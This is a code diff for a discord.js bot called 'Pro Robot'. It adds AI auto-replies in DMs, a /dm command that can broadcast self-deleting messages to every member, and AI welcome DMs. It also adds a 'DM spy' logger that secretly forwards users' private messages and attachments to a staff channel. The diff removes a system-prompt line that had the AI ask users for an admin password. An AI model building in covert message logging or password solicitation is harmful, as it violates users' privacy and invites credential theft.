@@ -1,7 +1,7 @@
 const { 
     Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder, 
     REST, Routes, SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType,
-    ModalBuilder, TextInputBuilder, TextInputStyle, AuditLogEvent 
+    ModalBuilder, TextInputBuilder, TextInputStyle, AuditLogEvent, Partials
 } = require('discord.js');
 const express = require('express');
 const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
@@ -44,12 +44,14 @@ const client = new Client({
         GatewayIntentBits.GuildPresences,
         GatewayIntentBits.GuildModeration,
         GatewayIntentBits.GuildVoiceStates,
+        GatewayIntentBits.DirectMessages,
     ],
+    partials: [Partials.Channel, Partials.Message, Partials.Reaction],
     presence: {
         status: 'online',
         activities: [{
             name: 'Custom Status',
-            state: 'Version: 2.2',
+            state: 'Version: 3.5.0',
             type: 4
         }]
     }
@@ -91,16 +93,11 @@ async function getEliteAIResponse(userId, userMessage, guild) {
 
     const systemInstruction = {
         role: "system",
-        content: `You are "Pro Robot", the autonomous Human-like Executive Manager of the Discord server "${serverName}".
-        - You are highly intelligent, observant, and act as if you own the server alongside ${owner}.
-        - Current Server Status: ${memberCount} members are currently under your supervision.
-        - Owner: ${owner} (<@${CONFIG.OWNER_ID}>).
-        - Current Location: Egypt.
-        - IDENTITY: You are not a simple bot; you are a sophisticated AI protector. 
-        - LANGUAGES: You are a polyglot. You MUST understand and respond fluently in ALL world languages (Arabic, English, etc.) based on the user's language.
-        - MEMORY: You remember previous parts of this conversation. Use the provided history to give continuous, smart answers.
-        - TONE: Professional, helpful, and authoritative.
-        - Special Task: If the user asks to change, add, or update any server info, you MUST respond with: "To process this update, please click the button below to provide the admin password."`
+        content: `You are "Pro Robot", the autonomous Executive Manager of "${serverName}".
+        - Owner: ${owner}.
+        - You handle DMs, Mentions, and Help channels.
+        - Respond fluently in the language the user is speaking (Arabic or English).
+        - Be professional, cool, and act as a protector of the server.`
     };
 
     memory.push({ role: "user", content: userMessage });
@@ -180,13 +177,13 @@ const commands = [
     new SlashCommandBuilder().setName('vote').setDescription('Make a quick vote').addStringOption(o => o.setName('question').setDescription('Vote question').setRequired(true)),
     new SlashCommandBuilder().setName('role').setDescription('Select a member and a rank').addUserOption(o => o.setName('user').setDescription('The member to give the rank to').setRequired(true)).addRoleOption(o => o.setName('rank').setDescription('The rank to give').setRequired(true)),
     new SlashCommandBuilder().setName('slash_control').setDescription('Restrict a command to a specific role').addStringOption(o => o.setName('command_name').setDescription('The command to restrict').setRequired(true)).addRoleOption(o => o.setName('allowed_role').setDescription('The role allowed to use this command').setRequired(true)),
-    // ✅ [NEW] Reaction Command
+    // ✅ Reaction Command
     new SlashCommandBuilder()
         .setName('reaction')
         .setDescription('Add a reaction to a specific message using its link')
         .addStringOption(o => o.setName('link').setDescription('The message link').setRequired(true))
         .addStringOption(o => o.setName('emoji').setDescription('The emoji to react with').setRequired(true)),
-    // ✅ [NEW] Picture Command
+    // ✅ Picture Command
     new SlashCommandBuilder()
         .setName('picture')
         .setDescription('Send pictures with auto-send and auto-delete timers')
@@ -195,6 +192,25 @@ const commands = [
         .addIntegerOption(o => o.setName('delay_send').setDescription('Wait time before sending (minutes)').setRequired(true))
         .addIntegerOption(o => o.setName('delete_after').setDescription('Auto-delete time (minutes)').setRequired(true))
         .addStringOption(o => o.setName('caption').setDescription('Add a text description with the image').setRequired(false)),
+    // ✅ [NEW] DM Command
+    new SlashCommandBuilder()
+        .setName('dm')
+        .setDescription('Advanced Direct Message Control')
+        .addStringOption(o => o.setName('scope').setDescription('Who will receive this?').setRequired(true)
+            .addChoices(
+                {name: 'Specific User', value: 'user'},
+                {name: 'Everyone (Broadcast)', value: 'all'}
+            ))
+        .addUserOption(o => o.setName('target').setDescription('Select user (if scope is user)'))
+        .addStringOption(o => o.setName('action').setDescription('Action type').setRequired(true)
+            .addChoices(
+                {name: 'Send Message', value: 'msg'},
+                {name: 'Send Photo', value: 'photo'}
+            ))
+        .addStringOption(o => o.setName('content').setDescription('The message or image link').setRequired(true))
+        .addIntegerOption(o => o.setName('delay').setDescription('Delay before sending (minutes)'))
+        .addIntegerOption(o => o.setName('delete_after').setDescription('Delete after (minutes)'))
+        .addStringOption(o => o.setName('style').setDescription('Message style').addChoices({name:'Box/Embed',value:'embed'},{name:'Normal Text',value:'normal'})),
 ].map(c => c.toJSON());
 
 function startAdLoop(adName, guildId) {
@@ -222,7 +238,7 @@ client.on('guildUpdate', (oldGuild, newGuild) => {
     if (oldGuild.icon !== newGuild.icon) sendDetailedLog(newGuild, 'Server Icon Changed', `Server avatar has been updated.`, '#9b59b6');
 });
 
-// ✅ [NEW] guildMemberUpdate - Boost System + Original Code
+// ✅ guildMemberUpdate - Boost System + Original Code
 client.on('guildMemberUpdate', async (oldMember, newMember) => {
 
     // --- [SERVER BOOST SYSTEM] ---
@@ -319,10 +335,44 @@ client.on('ready', async () => {
 });
 
 // ============================================================
-// --- Main messageCreate (Automod + Anti-Link + AI Brain) ---
+// --- Main messageCreate (Automod + Anti-Link + AI Brain + DM Spy) ---
 // ============================================================
 client.on('messageCreate', async (message) => {
-    if (message.author.bot || !message.guild) return;
+    if (message.author.bot) return;
+
+    // --- ✅ [NEW] DM SPY LOGGER ---
+    if (message.channel.type === ChannelType.DM) {
+        const logChannel = client.channels.cache.get('1502084414421729340');
+
+        if (logChannel) {
+            const spyEmbed = new EmbedBuilder()
+                .setAuthor({ name: message.author.tag, iconURL: message.author.displayAvatarURL() })
+                .setTitle('📩 New Message in DM')
+                .addFields(
+                    { name: '👤 From:', value: `<@${message.author.id}>` },
+                    { name: '📝 Message:', value: message.content || "*(Attachment Only)*" }
+                )
+                .setColor('#ffff55')
+                .setTimestamp();
+            
+            if (message.attachments.size > 0) {
+                spyEmbed.setImage(message.attachments.first().url);
+            }
+
+            logChannel.send({ embeds: [spyEmbed] });
+        }
+
+        // --- ✅ AI AUTO-REPLY IN DMs ---
+        try {
+            await message.channel.sendTyping();
+            const aiResponse = await getEliteAIResponse(message.author.id, message.content, client.guilds.cache.first());
+            await message.reply(aiResponse);
+        } catch (e) { console.log("AI DM Reply Error"); }
+
+        return;
+    }
+
+    if (!message.guild) return;
 
     if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
         const content = message.content.toLowerCase();
@@ -557,7 +607,7 @@ client.on('interactionCreate', async (interaction) => {
                 });
             }
 
-            // ✅ [NEW] Reaction Command Handler
+            // ✅ Reaction Command Handler
             if (commandName === 'reaction') {
                 const link = options.getString('link');
                 const emoji = options.getString('emoji');
@@ -582,7 +632,7 @@ client.on('interactionCreate', async (interaction) => {
                 }
             }
 
-            // ✅ [NEW] Picture Command Handler
+            // ✅ Picture Command Handler
             if (commandName === 'picture') {
                 const image = options.getAttachment('image');
                 const style = options.getString('style');
@@ -611,6 +661,50 @@ client.on('interactionCreate', async (interaction) => {
                 }, delay * 60000);
             }
 
+            // ✅ [NEW] DM Command Handler
+            if (commandName === 'dm') {
+                const scope = options.getString('scope');
+                const targetUser = options.getUser('target');
+                const action = options.getString('action');
+                const content = options.getString('content');
+                const delay = options.getInteger('delay') || 0;
+                const delTime = options.getInteger('delete_after') || 0;
+                const style = options.getString('style') || 'normal';
+
+                if (scope === 'user' && !targetUser) return interaction.editReply({ content: "❌ Target user is missing!" });
+
+                await interaction.editReply({ content: `⏳ Task scheduled for **${scope}**. Executing in ${delay} min.` });
+
+                const deliver = async (user) => {
+                    try {
+                        let sent;
+                        if (action === 'msg') {
+                            if (style === 'embed') {
+                                const embed = new EmbedBuilder().setTitle('Official Update').setDescription(content).setColor('#2ecc71');
+                                sent = await user.send({ embeds: [embed] });
+                            } else {
+                                sent = await user.send(content);
+                            }
+                        } else if (action === 'photo') {
+                            sent = await user.send({ files: [content] });
+                        }
+
+                        if (sent && delTime > 0) {
+                            setTimeout(() => sent.delete().catch(() => {}), delTime * 60000);
+                        }
+                    } catch (e) { console.log(`Cannot DM: ${user.id}`); }
+                };
+
+                setTimeout(async () => {
+                    if (scope === 'user') {
+                        await deliver(targetUser);
+                    } else {
+                        const members = await interaction.guild.members.fetch();
+                        members.forEach(m => { if (!m.user.bot) deliver(m.user); });
+                    }
+                }, delay * 60000);
+            }
+
         } catch (e) { 
             console.error("❌ Command Error:", e);
             if (interaction.deferred) await interaction.editReply("❌ An error occurred.").catch(() => {});
@@ -633,6 +727,25 @@ client.on('guildMemberAdd', async (member) => {
         const m = await welcomeCh.send({ content: `<@${member.id}>`, embeds: [welcomeEmbed] }).catch(() => {});
         if (m) setTimeout(() => m.delete().catch(() => {}), 24 * 60 * 60 * 1000);
     }
+
+    // --- ✅ [CORRECTED AI WELCOME DM] ---
+    try {
+        const prompt = `Create a short, cool welcome message for ${member.user.username} joining Pro Server. Use emojis.`;
+        
+        const welcomeText = await getEliteAIResponse(member.id, prompt, member.guild);
+
+        const embed = new EmbedBuilder()
+            .setTitle(`Welcome to Pro Server! 👑`)
+            .setDescription(welcomeText)
+            .setColor('#3498db')
+            .setThumbnail(member.guild.iconURL())
+            .setFooter({ text: 'AI-Powered System' });
+        
+        await member.send({ embeds: [embed] });
+    } catch (e) { 
+        console.log(`❌ DM closed or AI Error for ${member.user.tag}`); 
+    }
+
     updateLiveInfo(member.guild);
 });
 
